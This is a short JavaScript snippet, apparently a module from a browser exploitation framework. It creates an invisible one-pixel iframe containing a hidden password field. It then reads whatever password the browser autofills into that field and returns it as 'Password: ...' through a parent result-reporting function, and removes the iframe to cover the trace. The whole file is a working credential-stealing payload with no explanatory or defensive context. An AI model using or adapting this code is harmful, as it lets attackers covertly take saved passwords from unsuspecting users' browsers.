
// create iframe
var iframe = document.createElement('iframe');
iframe.setAttribute("width", "1");
iframe.setAttribute("height", "1");
iframe.setAttribute("style", "visibility:hidden;");
document.body.appendChild(iframe);

// write content to iframe and return result
ifrm = (iframe.contentWindow) ? iframe.contentWindow : (iframe.contentDocument.document) ? iframe.contentDocument.document : iframe.contentDocument;
ifrm.document.write('<form><input id=p type=password style=visibility:hidden></form>');
ifrm.setTimeout('parent.return_result(parent.result_id, "Password: " + document.getElementById("p").value)', 100);

// remove iframe
setTimeout('document.body.removeChild(iframe);', 200);

